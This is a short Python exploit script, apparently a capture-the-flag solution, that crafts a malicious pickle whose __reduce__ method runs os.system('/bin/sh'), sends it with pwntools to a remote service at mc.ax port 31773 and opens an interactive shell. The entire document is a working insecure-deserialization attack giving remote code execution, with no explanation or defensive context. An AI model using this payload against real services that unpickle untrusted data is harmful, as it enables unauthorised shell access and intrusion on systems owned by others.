# -*- coding: utf-8 -*-
import codecs
import pickle
from pwn import * 

class RCE: 
    def __reduce__(self):
        cmd = ('/bin/sh')
        return __import__('os').system, (cmd, )
    
pickled = pickle.dumps(RCE())
codecs.decode(pickled)

io = remote('mc.ax', 31773)
io.recvuntil('pickle: ')
io.send(pickled)
io.interactive()